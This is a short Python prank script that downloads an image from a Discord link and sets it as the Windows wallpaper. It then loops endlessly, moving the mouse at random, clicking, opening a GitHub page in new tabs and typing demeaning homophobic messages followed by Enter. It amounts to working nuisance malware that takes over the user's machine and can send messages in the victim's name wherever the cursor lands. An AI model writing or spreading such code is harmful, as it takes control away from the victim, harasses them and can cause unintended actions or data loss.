import pyautogui, random, os, threading, webbrowser, ctypes, requests

#Downloading image and saving it locally to directory where the script is
bgUrl = "https://cdn.discordapp.com/attachments/921827224955535380/925382106727743488/Screenshot_20210330-114329_Discord.jpg" #You can change url but make sure it goes directly to image
download = requests.get(bgUrl)
file = open("background.png", "wb")
file.write(download.content)
file.close()
path = os.getcwd() + "/background.png"
ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 0) #Using ctypes module to change background that we have downloaded

#Gets users width and height of screen that is used in movecursor function
width, height = pyautogui.size()

#Opens website by url that you provide in variable
def openwebsite():
    url = "https://github.com/Owersite"
    webbrowser.open(url, new=2)

#Moves mouse on random position on your screen
def movecursor():
    randomX = random.randint(0, width)
    randomY = random.randint(0, height)
    pyautogui.moveTo(randomX, randomY)

#Spam clicks left and right mouse button click
def clicking():
    pyautogui.doubleClick()
    pyautogui.click(button="right")

#Writes messages quickly and spams enter button on keyboard to send message
#So if your cursor gets in some text box where you can write something it will spam messages that you provide
def spammsg():
    pyautogui.write("Im gay ...")
    pyautogui.write("Owersite is my daddy ...")
    pyautogui.press("enter")

while True:
    thread1 = threading.Thread(target=movecursor)
    thread1.start()
    thread2 = threading.Thread(target=openwebsite)
    thread2.start()
    spammsg()
    clicking()
